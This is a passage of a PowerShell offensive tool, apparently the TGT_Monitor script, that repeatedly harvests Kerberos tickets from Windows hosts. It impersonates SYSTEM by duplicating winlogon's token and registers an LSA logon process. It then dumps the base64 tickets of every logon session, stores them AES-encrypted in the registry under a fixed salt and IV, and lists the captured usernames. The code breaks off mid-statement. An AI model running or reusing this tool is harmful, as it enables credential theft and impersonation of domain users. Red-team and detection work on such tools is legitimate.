function TGT_Monitor {
	
	<#

	.SYNOPSIS
	TGT_Monitor Author: Rob LP (@L3o4j)
	https://github.com/Leo4j/TGT_Monitor
	Dependency: https://github.com/MzHmO/PowershellKerberos
	
	#>
	
	param (
		[string]$EncryptionKey,
		[switch]$Read,
		[switch]$Clear,
		[int]$Timeout
	)
	
	# Derive key and IV from passphrase
	$keySize = 256
	$keyIV = Get-AesKeyFromPassphrase -passphrase $EncryptionKey -keySize $keySize
	$key = $keyIV.Key
	$IV = $keyIV.IV
	$encodedKey = [Convert]::ToBase64String($keyIV.Key)
	$encodedIV = [Convert]::ToBase64String($keyIV.IV)

	$registryPath = 'HKLM:\SOFTWARE\MONITOR'
	
	if($Clear){
 		if(Test-Path $registryPath){Get-Item $registryPath | Remove-Item -Recurse -Force}
  		Remove-Variable -Name finalUniqueSections -Scope Global -ErrorAction SilentlyContinue
		Write-Output ""
		Write-Output "[+] Registry Cleared"
		Write-Output ""
		return
	}

	# Check if the registry path exists and has properties before entering the loop
	if($Read){
		if (Test-Path $registryPath) {
			$properties = Get-ItemProperty -Path $registryPath
			if ($properties.PSObject.Properties.Count -gt 0) {
				$properties.PSObject.Properties | Where-Object { $_.Name -like 'UniqueSection*' } | ForEach-Object {
					# Assuming that the value is stored as a Base64 encoded byte array
					$cleanBase64String = Clean-Base64String $_.Value
					$encryptedBytesWithIV = [Convert]::FromBase64String($cleanBase64String)
					try {
						# Decrypt the value using the key and IV
						$decryptedValue = ConvertFrom-SecureStringAES -encryptedStringWithIV $encryptedBytesWithIV -key $key -IV $IV
						Write-Output ""
						Write-Output $decryptedValue
						Write-Output "====================================="
					} catch {
						Write-Error "An error occurred during decryption: $_"
					}
				}
				
				Write-Output "=================END================="
				Write-Output "====================================="
				Write-Output ""
			}
		}
		
		else{
			Write-Output ""
			Write-Output "[-] Empty Registry"
			Write-Output ""
			return
		}
		return
	}
	
	else{
		if (Test-Path $registryPath) {
			Write-Output ""
			Write-Output "Krb TGTs:"
			Write-Output ""
			$properties = Get-ItemProperty -Path $registryPath
			$AllExtractedTGTs = $properties.PSObject.Properties | Where-Object { $_.Name -like 'UniqueSection*' } | ForEach-Object {
				# Decrypt the value read from the registry
				$cleanBase64String = Clean-Base64String $_.Value
				$encryptedBytesWithIV = [Convert]::FromBase64String($cleanBase64String)
				try {
					# Decrypt the value using the key and IV
					$decryptedValue = ConvertFrom-SecureStringAES -encryptedStringWithIV $encryptedBytesWithIV -key $key -IV $IV
					$decryptedValue = $decryptedValue -split "`r?`n" | Where-Object { $_ -match "Username" }
					$decryptedValue = $decryptedValue -replace "UserName         : ",""
					$decryptedValue
				} catch {}
			}
			
			$AllExtractedTGTs | Sort-Object -Unique
			
			Write-Output ""
		}
	}
	
	if($Timeout){
 		$stopwatch = [System.Diagnostics.Stopwatch]::StartNew() # Start the stopwatch
   	}

	while($True){
		
		Start-Sleep 5
		
		$updated = $false

		$data = Invoke-Kirby

		$rawData = $data -join "`r`n"

		$sectionSeparator = "`r`n={6,}`r`n"

		$sections = $rawData -split $sectionSeparator

		$hostname = $env:COMPUTERNAME
		$domain = $env:USERDNSDOMAIN

		$filterUsername = "${hostname}`$@$domain"

		$filteredSections = $sections | Where-Object {
			# Using -like with wildcards for pattern matching
			-not ($_ -like "*UserName         : $filterUsername*")
		}

		$uniqueSections = @()
		$seen = @{}

		# Identify and remove duplicate sections
		$uniqueSections = @()
		$seen = @{}

		foreach ($section in $filteredSections) {
			# Normalize the section by removing extra whitespaces and converting to a consistent case for comparison
			$normalizedSection = $section -replace "\s+", " " -replace "\r?\n", " " -replace "`t", " " | Out-String
			$normalizedSection = $normalizedSection.Trim().ToLower()
			$hash = $normalizedSection.GetHashCode()
			if (-not $seen.ContainsKey($hash)) {
				$seen[$hash] = $true
				$uniqueSections += $section
			}
		}

		# Initialize final unique sections array if not already present
		if (-not (Test-Path variable:global:finalUniqueSections)) {
			$global:finalUniqueSections = @{}
		}
		
		# Keep track of the number of sections before the update
		$initialCount = $global:finalUniqueSections.Count

		# At the end of your script, after you've computed $uniqueSections for the current run
		foreach ($section in $uniqueSections) {
			# Normalize the section for comparison as before
			$normalizedSection = $section -replace "\s+", " " -replace "\r?\n", " " -replace "`t", " " | Out-String
			$normalizedSection = $normalizedSection.Trim().ToLower()
			$hash = $normalizedSection.GetHashCode()
			
			# Check if this section's hash is already in the final unique sections
			if (-not $global:finalUniqueSections.ContainsKey($hash)) {
				$global:finalUniqueSections[$hash] = $section
			}
		}

		# Create a new hashtable to store non-empty entries
		$cleanedFinalUniqueSections = @{}

		foreach ($entry in $global:finalUniqueSections.GetEnumerator()) {
			if ($entry.Key -and $entry.Value) {
				# Only add entries with non-null and non-empty keys and values
				$cleanedFinalUniqueSections[$entry.Key] = $entry.Value
			}
		}

		# Replace the original hashtable with the cleaned one
		$global:finalUniqueSections = $cleanedFinalUniqueSections
		
		$finalCount = $global:finalUniqueSections.Count
		if ($finalCount -gt $initialCount) {
			$updated = $true
		}

		# Clean up the existing registry entries before saving new ones
		$registryPath = 'HKLM:\SOFTWARE\MONITOR'
		if (Test-Path $registryPath) {
			Get-Item $registryPath | Remove-Item -Recurse -Force > $null
		}

		# Ensure the registry path exists
		if (-not (Test-Path $registryPath)) {
			New-Item -Path $registryPath -Force > $null
		}

		$index = 0
		foreach ($value in $global:finalUniqueSections.Values) {
			# Encrypt the value before writing to the registry
			$encryptedValue = ConvertTo-SecureStringAES -stringToEncrypt $value -key $key -IV $IV
			$encryptedValueBase64 = [Convert]::ToBase64String($encryptedValue)

			$itemPath = $registryPath # The item path is the same as the registry path in this case
			$propertyName = "UniqueSection" + $index
			New-ItemProperty -Path $itemPath -Name $propertyName -Value $encryptedValueBase64 -PropertyType String -Force > $null
			$index++
		}
		
		if ($updated) {
			Write-Output ""
			Write-Output "Krb TGTs:"
			Write-Output ""
			$properties = Get-ItemProperty -Path $registryPath
			$AllExtractedTGTs = $properties.PSObject.Properties | Where-Object { $_.Name -like 'UniqueSection*' } | ForEach-Object {
				# Decrypt the value read from the registry
				$cleanBase64String = Clean-Base64String $_.Value
				$encryptedBytesWithIV = [Convert]::FromBase64String($cleanBase64String)
				try {
					# Decrypt the value using the key and IV
					$decryptedValue = ConvertFrom-SecureStringAES -encryptedStringWithIV $encryptedBytesWithIV -key $key -IV $IV
					$decryptedValue = $decryptedValue -split "`r?`n" | Where-Object { $_ -match "Username" }
					$decryptedValue = $decryptedValue -replace "UserName         : ",""
					$decryptedValue
				} catch {}
			}
			
			$AllExtractedTGTs | Sort-Object -Unique
			
			Write-Output ""
		}
		
		if ($Timeout -AND ($stopwatch.Elapsed.TotalSeconds -gt $Timeout)) {
            		Write-Output "Timeout reached ($Timeout seconds)"
			Write-Output ""
            		break # Exit the loop
        	}
	}
}

function ConvertTo-SecureStringAES {
    param (
        [string]$stringToEncrypt,
        [byte[]]$key,
        [byte[]]$IV
    )

    $aesManaged = New-Object System.Security.Cryptography.AesManaged
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

    $aesManaged.Key = $key
    $aesManaged.IV = $IV

    $encryptor = $aesManaged.CreateEncryptor($aesManaged.Key, $aesManaged.IV)
    $stringBytes = [System.Text.Encoding]::UTF8.GetBytes($stringToEncrypt)
    $encryptedData = $encryptor.TransformFinalBlock($stringBytes, 0, $stringBytes.Length)

    # Return the IV and encrypted data
    return [byte[]]($IV + $encryptedData)
}

function ConvertFrom-SecureStringAES {
    param (
        [byte[]]$encryptedStringWithIV,
        [byte[]]$key
    )

    $aesManaged = New-Object System.Security.Cryptography.AesManaged
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

    # Extract the IV from the encrypted data
    $IV = $encryptedStringWithIV[0..15]
    $aesManaged.Key = $key
    $aesManaged.IV = $IV
    $decryptor = $aesManaged.CreateDecryptor($aesManaged.Key, $aesManaged.IV)

    # Extract the encrypted part of the string (skipping the IV part)
    $encryptedString = $encryptedStringWithIV[16..($encryptedStringWithIV.Length - 1)]
    $decryptedBytes = $decryptor.TransformFinalBlock($encryptedString, 0, $encryptedString.Length)
    [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
}

function Get-AesKeyFromPassphrase {
    param (
        [string]$passphrase,
        [int]$keySize = 256 # Key size in bits (AES allows 128, 192, or 256)
    )
    
    # Fixed salt value
    # Ensure this is a constant and secret value that does not change
    $salt = [byte[]](0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,0x0A,0x0B,0x0C,0x0D,0x0E,0x0F,0x10)
    
    # Create an instance of Rfc2898DeriveBytes and get the bytes for the key
    $keyGenerator = New-Object System.Security.Cryptography.Rfc2898DeriveBytes $passphrase, $salt, 10000
    $key = $keyGenerator.GetBytes($keySize / 8) # divide by 8 to convert bits to bytes

    # Fixed IV value
    # Ensure this is a constant and secret value that does not change
    $IV = [byte[]](0x10,0x0F,0x0E,0x0D,0x0C,0x0B,0x0A,0x09,0x08,0x07,0x06,0x05,0x04,0x03,0x02,0x01)
    
    return @{Key = $key; IV = $IV}
}


function Clean-Base64String($base64String) {
    # Remove any whitespace or newline characters
    $cleanString = $base64String -replace '\s',''
    
    # Add padding if the string length is not a multiple of 4
    while (($cleanString.Length % 4) -ne 0) {
        $cleanString = $cleanString + '='
    }

    return $cleanString
}

Function Invoke-Kirby{
Set-Alias nO New-Object
Set-Alias aM Add-Member
Set-Alias wO Write-Output
$x="public"
$sn="NT.AUT.*\\"
function IAS{$p=gps winlogon|select -f 1 -exp Id;if(($h=[impsys.win32]::OpenProcess(0x400,$true,[Int32]$p))-eq[IntPtr]::Zero){$e=[Runtime.InteropServices.Marshal]::GetLastWin32Error()}$t=[IntPtr]::Zero;if(-not[impsys.win32]::OpenProcessToken($h,0x0E,[ref]$t)){$e=[Runtime.InteropServices.Marshal]::GetLastWin32Error()}$d=[IntPtr]::Zero;if(-not[impsys.win32]::DuplicateTokenEx($t,0x02000000,[IntPtr]::Zero,0x02,0x01,[ref]$d)){$e=[Runtime.InteropServices.Marshal]::GetLastWin32Error()}try{if(-not[impsys.win32]::ImpersonateLoggedOnUser($d)){$e=[Runtime.InteropServices.Marshal]::GetLastWin32Error()}$c=$([System.Security.Principal.WindowsIdentity]::GetCurrent().Name);if($c-match $sn){return $true}else{return $false}}catch{return $false}return $false}
Function LsaRegisterLogonProcess(){$LPN="User32LogonProcess";$LS=nO ticket.dump+LSA_STRING_IN;$lh=nO System.IntPtr;[System.UInt64]$SecurityMode=0;$LS.Length=[System.UInt16]$LPN.Length;$LS.MaximumLength=[System.UInt16]($LPN.Length+1);$LS.buffer=[System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($LPN);[int]$ret=[ticket.dump]::LsaRegisterLogonProcess($LS,[ref]$lh,[ref]$SecurityMode);if($ret-ne 0){$ret;$dtk=$false;return $(LsaConnectUntrusted)}return $lh}
function LsaConnectUntrusted{$lh=nO System.IntPtr;[int]$ret=[ticket.dump]::LsaConnectUntrusted([ref]$lh);if($ret-ne 0){throw "";return -1}return $lh}
Function Get-lsah(){$lh=nO System.IntPtr;$sysres=IAS;if($sysres){$dtk=$true;return $(LsaRegisterLogonProcess)}else{$dtk=$false;return $(LsaConnectUntrusted)}}
Function GetLogonSessionData($luid){$luidptr=nO System.IntPtr;$sessionDataPtr=nO System.IntPtr;try{$luidptr=[System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf($luid));[System.Runtime.InteropServices.Marshal]::StructureToPtr($luid,$luidptr,$false);$ret=[ticket.dump]::LsaGetLogonSessionData($luidptr,[ref]$sessionDataPtr);if($ret-eq 0){$type=nO ticket.dump+SECURITY_LOGON_SESSION_DATA;$type=$type.GetType();[ticket.dump+SECURITY_LOGON_SESSION_DATA]$unsafeData=[System.Runtime.InteropServices.Marshal]::PtrToStructure($sessionDataPtr,[type]$type);$LSD=nO ticket.dump+LogonSessionData;$LSD.AuthenticationPackage=[System.Runtime.InteropServices.Marshal]::PtrToStringUni($unsafeData.AuthenticationPackage.Buffer,$unsafeData.AuthenticationPackage.Length/2);$LSD.DnsDomainName=[System.Runtime.InteropServices.Marshal]::PtrToStringUni($unsafeData.DnsDomainName.Buffer,$unsafeData.DnsDomainName.Length/2);$LSD.LogonID=$unsafeData.LogonID;$LSD.LogonTime=[System.DateTime]::FromFileTime($unsafeData.LogonTime);$LSD.LogonServer=[System.Runtime.InteropServices.Marshal]::PtrToStringUni($unsafeData.LogonServer.Buffer,$unsafeData.LogonServer.Length/2);[ticket.dump+LogonType]$LSD.LogonType=$unsafeData.LogonType;$LSD.Sid=nO System.Security.Principal.SecurityIdentifier($unsafeData.PSid);$LSD.Upn=[System.Runtime.InteropServices.Marshal]::PtrToStringUni($unsafeData.Upn.Buffer,$unsafeData.Upn.Length/2);$LSD.Session=[int]$unsafeData.Session;$LSD.username=[System.Runtime.InteropServices.Marshal]::PtrToStringUni($unsafeData.username.Buffer,$unsafeData.username.Length/2);$LSD.LogonDomain=[System.Runtime.InteropServices.Marshal]::PtrToStringUni($unsafeData.LogonDomain.buffer,$unsafeData.LogonDomain.Length/2)}}finally{if($sessionDataPtr-ne[System.IntPtr]::Zero){[ticket.dump]::LsaFreeReturnBuffer($sessionDataPtr)>$null}if($luidptr-ne[System.IntPtr]::Zero){[ticket.dump]::LsaFreeReturnBuffer($luidptr)>$null}}return $LSD}
Function GCL(){$o=klist;return $o.split("`n")[1].split(":")[1]}
Function RAA(){$user=[System.Security.Principal.WindowsIdentity]::GetCurrent();$princ=nO System.Security.Principal.WindowsPrincipal($user);return $princ.IsInRole("Administrators") -or $user.Name -match $sn}
Function ET([intptr]$l,[int]$a,[ticket.dump+LUID]$u=(nO ticket.dump+LUID),[string]$t,[System.UInt32]$f=0,$tk){$r=[System.IntPtr]::Zero;$q=nO ticket.dump+KERB_RETRIEVE_TKT_REQUEST;$qType=$q.GetType();$s=nO ticket.dump+KERB_RETRIEVE_TKT_RESPONSE;$sType=$s.GetType();$e=0;$v=0;$q.MessageType=[ticket.dump+KERB_PROTOCOL_MESSAGE_TYPE]::KerbRetrieveEncodedTicketMessage;$q.LogonId=$u;$q.TicketFlags=0x0;$q.CacheOptions=0x8;$q.EncryptionType=0x0;$n=nO ticket.dump+UNICODE_STRING;$n.Length=[System.UInt16]($t.Length*2);$n.MaximumLength=[System.UInt16](($n.Length)+2);$n.buffer=[System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($t);$q.TargetName=$n;$z=[System.Runtime.InteropServices.Marshal]::SizeOf([type]$qType);$x=$z+$n.MaximumLength;$y=[System.Runtime.InteropServices.Marshal]::AllocHGlobal($x);[System.Runtime.InteropServices.Marshal]::StructureToPtr($q,$y,$false);$w=[System.IntPtr]([System.Int64]($y.ToInt64()+[System.Int64]$z));[ticket.dump]::CopyMemory($w,$n.buffer,$n.MaximumLength);if([System.IntPtr]::Size -eq 8){$size=24}else{$size=16}[System.Runtime.InteropServices.Marshal]::WriteIntPtr($y,$size,$w);$rc=[ticket.dump]::LsaCallAuthenticationPackage($l,$a,$y,$x,[ref]$r,[ref]$e,[ref]$v);if(($rc-eq 0)-and($e -ne 0)){$s=[System.Runtime.InteropServices.Marshal]::PtrToStructure($r,[type]$sType);$encodedTicketSize=$s.Ticket.EncodedTicketSize;$encodedTicket=[System.Array]::CreateInstance([byte],$encodedTicketSize);[System.Runtime.InteropServices.Marshal]::Copy($s.Ticket.EncodedTicket,$encodedTicket,0,$encodedTicketSize)}[ticket.dump]::LsaFreeReturnBuffer($r);[System.Runtime.InteropServices.Marshal]::FreeHGlobal($y);$tobj=nO psobject;$tobj|aM -Type NoteProperty -Name "success" -Value $true;try{$tobj|aM -Type NoteProperty -Name "Ticket" -Value $([Convert]::ToBase64String($encodedTicket));$tobj|aM -Type NoteProperty -Name "SessionKeyType" -Value $s.Ticket.SessionKey.KeyType}catch{$tobj.success=$false}return $tobj}
Function EnumerateLogonSessions(){$luids=@();if(!(RAA)){$strLuid=GCL;$intLuid=[convert]::ToInt32($strluid,16);$luid=nO ticket.dump+LUID;$luid.LowPart=$intLuid;$luids+=$luid;}else{$count=nO System.Int32;$luidptr=nO System.IntPtr;$ret=[ticket.dump]::LsaEnumerateLogonSessions([ref]$count,[ref]$luidptr);if($ret -ne 0){$ret}else{$Luidtype=nO ticket.dump+LUID;$Luidtype=$Luidtype.GetType();for($i=0;$i -lt[int32]$count;$i++){$luid=[System.Runtime.InteropServices.Marshal]::PtrToStructure($luidptr,[type]$Luidtype);$luids+=$luid;[System.IntPtr]$luidptr=$luidptr.ToInt64()+[System.Runtime.InteropServices.Marshal]::SizeOf([type]$Luidtype);}[ticket.dump]::LsaFreeReturnBuffer($luidptr)}}return $luids}
Function DSC($scs){foreach($sc in $scs){if($sc.Ticketb64 -ne $null-and(@($sc).Count -gt 0)-and($sc[0].LogonSession[0].LogonID.LowPart -ne "0")){foreach($tk in $sc){$si=if($tk.ServerName -like "*krbtgt*"){"Service Name     : {0}"-f $tk.ServerName}else{"Service Name     : {0}"-f $tk.ServerName}wO $si;wO ("EncryptionType   : {0}"-f ([ticket.dump+EncTypes]$tk.EncryptionType));wO ("Ticket Exp       : {0}"-f $tk.EndTime);wO ("Server Name      : {0}@{1}"-f ($tk.ServerName -split "/")[1],$tk.ServerRealm);wO ("UserName         : {0}@{1}" -f $tk.ClientName, $tk.ClientRealm);wO ("Flags            : {0}"-f $tk.TicketFlags);if($tk.SessionKeyType){wO ("Session Key Type : {0}`n"-f $tk.SessionKeyType)}wO $tk.Ticketb64;wO "";wO "=====================================";wO ""}}}}
function main{$tickdotnet = @"
[StructLayout(LayoutKind.Sequential)]$x struct LUID{$x UInt32 LowPart;$x Int32 HighPart;}[DllImport("secur32.dll",SetLastError=false)]$x static extern int LsaConnectUntrusted([Out]out IntPtr LsaHandle);[StructLayout(LayoutKind.Sequential)]$x struct LSA_STRING_IN{$x ushort Length;$x ushort MaximumLength;$x IntPtr buffer;}[DllImport("secur32.dll",SetLastError=true)]$x static extern int LsaRegisterLogonProcess(LSA_STRING_IN LogonProcessName,out IntPtr LsaHandle,out ulong SecurityMode);[DllImport("secur32.dll",SetLastError=false)]$x static extern int LsaLookupAuthenticationPackage([In]IntPtr LsaHandle,[In]ref LSA_STRING_IN PackageName,[Out]out UInt32 AuthenticationPackage);[DllImport("Secur32.dll",SetLastError=false)]$x static extern int LsaEnumerateLogonSessions(out uint LogonSessionCount,out IntPtr LogonSessionList);[DllImport("secur32.dll",SetLastError=false)]$x static extern int LsaFreeReturnBuffer([In]IntPtr buffer);$x enum LogonType{UndefinedLogonType,Interactive,Network,Batch,Service,Proxy,Unlock,NetworkCleartext,NewCredentials,RemoteInteractive,CachedInteractive,CachedRemoteInteractive,CachedUnlock}$x class LogonSessionData{$x LUID LogonID;$x string username;$x string LogonDomain;$x string AuthenticationPackage;$x LogonType logonType;$x int Session;$x SecurityIdentifier Sid;$x DateTime LogonTime;$x string LogonServer;$x string DnsDomainName;$x string Upn;}$x struct SECURITY_LOGON_SESSION_DATA{$x UInt32 size;$x LUID LogonID;$x LSA_STRING_IN username;$x LSA_STRING_IN LogonDomain;$x LSA_STRING_IN AuthenticationPackage;$x UInt32 logontype;$x UInt32 Session;$x IntPtr PSid;$x UInt64 LogonTime;$x LSA_STRING_IN LogonServer;$x LSA_STRING_IN DnsDomainName;$x LSA_STRING_IN Upn;}[DllImport("Secur32.dll",SetLastError=false)]$x static extern uint LsaGetLogonSessionData(IntPtr luid,out IntPtr ppLogonSessionData);$x enum KERB_PROTOCOL_MESSAGE_TYPE{KerbDebugRequestMessage,KerbQueryTicketCacheMessage,KerbChangeMachinePasswordMessage,KerbVerifyPacMessage,KerbRetrieveTicketMessage,KerbUpdateAddressesMessage,KerbPurgeTicketCacheMessage,KerbChangePasswordMessage,KerbRetrieveEncodedTicketMessage,KerbDecryptDataMessage,KerbAddBindingCacheEntryMessage,KerbSetPasswordMessage,KerbSetPasswordExMessage,KerbVerifyCredentialMessage,KerbQueryTicketCacheExMessage,KerbPurgeTicketCacheExMessage,KerbRefreshSmartcardCredentialsMessage,KerbAddExtraCredentialsMessage,KerbQuerySupplementalCredentialsMessage,KerbTransferCredentialsMessage,KerbQueryTicketCacheEx2Message,KerbSubmitTicketMessage,KerbAddExtraCredentialsExMessage}[StructLayout(LayoutKind.Sequential)]$x struct KERB_QUERY_TKT_CACHE_REQUEST{$x KERB_PROTOCOL_MESSAGE_TYPE MessageType;$x LUID LogonId;}[StructLayout(LayoutKind.Sequential)]$x struct UNICODE_STRING{$x ushort Length;$x ushort MaximumLength;$x IntPtr Buffer;}[StructLayout(LayoutKind.Sequential)]$x struct KERB_TICKET_CACHE_INFO_EX{$x UNICODE_STRING ClientName;$x UNICODE_STRING ClientRealm;$x UNICODE_STRING ServerName;$x UNICODE_STRING ServerRealm;$x long StartTime;$x long EndTime;$x long RenewTime;$x uint EncryptionType;$x uint TicketFlags;}[Flags]$x enum TicketFlags:uint{name_canonicalize=0x10000,forwardable=0x40000000,forwarded=0x20000000,hw_authent=0x00100000,initial=0x00400000,invalid=0x01000000,may_postdate=0x04000000,ok_as_delegate=0x00040000,postdated=0x02000000,pre_authent=0x00200000,proxiable=0x10000000,proxy=0x08000000,renewable=0x00800000,reserved=0x80000000,reserved1=0x00000001}$x enum EncTypes:uint{DES_CBC_CRC=0x0001,DES_CBC_MD4=0x0002,DES_CBC_MD5=0x0003,DES_CBC_raw=0x0004,DES3_CBC_raw=0x0006,DES3_CBC_SHA_1=0x0010,AES128_CTS_HMAC_SHA1_96=0x0011,AES256_CTS_HMAC_SHA1_96=0x0012,AES128_cts_hmac_sha256_128=0x0013,AES256_cts_hmac_sha384_192=0x0014,RC4_HMAC_MD5=0x0017,RC4_HMAC_MD5_EXP=0x0018}[StructLayout(LayoutKind.Sequential)]$x struct KERB_QUERY_TKT_CACHE_RESPONSE{$x KERB_PROTOCOL_MESSAGE_TYPE MessageType;$x int CountOfTickets;$x IntPtr Tickets;}[StructLayout(LayoutKind.Sequential)]$x struct SECURITY_HANDLE{$x IntPtr LowPart;$x IntPtr HighPart;}[StructLayout(LayoutKind.Sequential)]$x struct KERB_RETRIEVE_TKT_REQUEST{$x KERB_PROTOCOL_MESSAGE_TYPE MessageType;$x LUID LogonId;$x UNICODE_STRING TargetName;$x uint TicketFlags;$x uint CacheOptions;$x int EncryptionType;$x SECURITY_HANDLE CredentialsHandle;}[StructLayout(LayoutKind.Sequential)]$x struct KERB_CRYPTO_KEY{$x int KeyType;$x int Length;$x IntPtr Value;}[StructLayout(LayoutKind.Sequential)]$x struct KERB_EXTERNAL_TICKET{$x IntPtr ServiceName;$x IntPtr TargetName;$x IntPtr ClientName;$x UNICODE_STRING DomainName;$x UNICODE_STRING TargetDomainName;$x UNICODE_STRING AltTargetDomainName;$x KERB_CRYPTO_KEY SessionKey;$x uint TicketFlags;$x uint Flags;$x long KeyExpirationTime;$x long StartTime;$x long EndTime;$x long RenewUntil;$x long TimeSkew;$x int EncodedTicketSize;$x IntPtr EncodedTicket;}[StructLayout(LayoutKind.Sequential)]$x struct KERB_RETRIEVE_TKT_RESPONSE{$x KERB_EXTERNAL_TICKET Ticket;}[DllImport("Secur32.dll",SetLastError=true)]$x static extern int LsaCallAuthenticationPackage(IntPtr LsaHandle,uint AuthenticationPackage,IntPtr ProtocolSubmitBuffer,int SubmitBufferLength,out IntPtr ProtocolReturnBuffer,out ulong ReturnBufferLength,out int ProtocolStatus);[DllImport("secur32.dll",SetLastError=false)]$x static extern int LsaDeregisterLogonProcess([In]IntPtr LsaHandle);[DllImport("kernel32.dll",EntryPoint="CopyMemory",SetLastError=false)]$x static extern void CopyMemory(IntPtr dest,IntPtr src,uint count);
"@
$tickasm=[System.Reflection.Assembly]::LoadWithPartialName("System.Security.Principal");Add-Type -MemberDefinition $tickdotnet -Namespace "ticket" -Name "dump" -ReferencedAssemblies $tickasm.location -UsingNamespace System.Security.Principal;try{& {$ErrorActionPreference='Stop';[void][impsys.win32]}}catch{
Add-Type -TypeDefinition @"
using System;using System.Runtime.InteropServices;namespace impsys{$x class win32{[DllImport("kernel32.dll", SetLastError=true)]$x static extern bool CloseHandle(IntPtr hHandle);[DllImport("kernel32.dll", SetLastError=true)]$x static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);[DllImport("advapi32.dll", SetLastError=true)]$x static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);[DllImport("advapi32.dll", SetLastError=true)]$x static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, uint ImpersonationLevel, uint TokenType, out IntPtr phNewToken);[DllImport("advapi32.dll", SetLastError=true)]$x static extern bool ImpersonateLoggedOnUser(IntPtr hToken);[DllImport("advapi32.dll", SetLastError=true)]$x static extern bool RevertToSelf();}}
"@}
$authpckg = nO System.Int32;$rc = nO System.Int32;$krbname = "kerberos";$LS = nO ticket.dump+LSA_STRING_IN;$LS.Length = [uint16]$krbname.Length;$LS.MaximumLength = [uint16]($krbname.Length + 1);$LS.buffer = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($krbname);$lh = Get-lsah;$retcode = [ticket.dump]::LsaLookupAuthenticationPackage($lh,[ref]$LS,[ref]$authpckg);if ($retcode -ne 0){return -1}foreach($luid in EnumerateLogonSessions){if ($([System.Convert]::ToString($luid.LowPart,16) -eq 0x0)){continue;} else{$LSD = nO ticket.dump+LogonSessionData;try {$LSD = GetLogonSessionData($luid)} catch{continue}$sc = @();$tksPointer = nO System.IntPtr;$returnBufferLength = 0;$protocolStatus = 0;$tkCacheRequest = nO ticket.dump+KERB_QUERY_TKT_CACHE_REQUEST;$tkCacheRespone = nO ticket.dump+KERB_QUERY_TKT_CACHE_RESPONSE;$tkCacheResponeType = $tkCacheRespone.GetType();$tcr = nO ticket.dump+KERB_TICKET_CACHE_INFO_EX;$tkCacheRequest.MessageType = [ticket.dump+KERB_PROTOCOL_MESSAGE_TYPE]::KerbQueryTicketCacheExMessage;if(RAA){$tkCacheRequest.LogonId = $LSD.LogonID}else{$tkCacheRequest.LogonId = nO ticket.dump+LUID}$tQueryPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf($tkCacheRequest));[System.Runtime.InteropServices.Marshal]::StructureToPtr($tkCacheRequest,$tQueryPtr,$false);$retcode = [ticket.dump]::LsaCallAuthenticationPackage($lh,$authpckg,$tQueryPtr,[System.Runtime.InteropServices.Marshal]::SizeOf($tkCacheRequest),[ref]$tksPointer,[ref]$returnBufferLength,[ref]$protocolStatus);if(($retcode -eq 0) -and ($tksPointer -ne [System.IntPtr]::Zero)){[ticket.dump+KERB_QUERY_TKT_CACHE_RESPONSE]$tkCacheRespone = [System.Runtime.InteropServices.Marshal]::PtrToStructure($tksPointer,[type]$tkCacheResponeType);$count2 = $tkCacheRespone.CountOfTickets;if($count2 -ne 0){$cacheInfoType = $tcr.GetType();$dataSize = [System.Runtime.InteropServices.Marshal]::SizeOf([type]$cacheInfoType);for($j = 0;$j -lt $count2;$j++){[System.IntPtr]$currTicketPtr = [int64]($tksPointer.ToInt64() + [int](8 + $j * $dataSize));[ticket.dump+KERB_TICKET_CACHE_INFO_EX]$tcr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($currTicketPtr,[type]$cacheInfoType);$tk = nO psobject;Add-Member -InputObject $tk -MemberType NoteProperty -name "StartTime" -value  ([datetime]::FromFileTime($tcr.StartTime));Add-Member -InputObject $tk -MemberType NoteProperty -name "EndTime" -value  ([datetime]::FromFileTime($tcr.EndTime));Add-Member -InputObject $tk -MemberType NoteProperty -name  "RenewTime" -value ([datetime]::FromFileTime($tcr.RenewTime));Add-Member -InputObject $tk -MemberType NoteProperty -Name "TicketFlags" -Value ([ticket.dump+TicketFlags]$tcr.TicketFlags);Add-Member -InputObject $tk -MemberType NoteProperty -Name "EncryptionType" -Value $tcr.EncryptionType;Add-Member -InputObject $tk -MemberType NoteProperty -name  "ServerName" -value  ([System.Runtime.InteropServices.Marshal]::PtrToStringUni($tcr.ServerName.Buffer,$tcr.ServerName.Length / 2));Add-Member -InputObject $tk -MemberType NoteProperty -name  "ServerRealm" -value ([System.Runtime.InteropServices.Marshal]::PtrToStringUni($tcr.ServerRealm.Buffer,$tcr.ServerRealm.Length / 2));Add-Member -InputObject $tk -MemberType NoteProperty -name  "ClientName" -value ([System.Runtime.InteropServices.Marshal]::PtrToStringUni($tcr.ClientName.Buffer,$tcr.ClientName.Length / 2));Add-Member -InputObject $tk -MemberType NoteProperty -name "ClientRealm" -value ([System.Runtime.InteropServices.Marshal]::PtrToStringUni($tcr.ClientRealm.Buffer,$tcr.ClientRealm.Length / 2));Add-Member -InputObject $tk -MemberType NoteProperty -Name "LogonSession" -Value $LSD;$InfoObj = (ET $lh $authpckg $tkCacheRequest.LogonId $tk.ServerName $tcr.TicketFlags $tk);if ($InfoObj.success -eq $true){$SessionEncType = $InfoObj.SessionKeyType;$tkb64 = $InfoObj.Ticket;Add-Member -InputObject $tk -MemberType NoteProperty -Name "Ticketb64" -Value $tkb64;try{if($SessionEncType -ne 0 ){Add-Member -InputObject $tk -MemberType NoteProperty -Name "SessionKeyType" -Value ([ticket.dump+EncTypes]$SessionEncType)};}catch{}} else{}$sc += $tk;}}}[ticket.dump]::LsaFreeReturnBuffer($tksPointer)|Out-Null;[System.Runtime.InteropServices.Marshal]::FreeHGlobal($tQueryPtr);$scs += 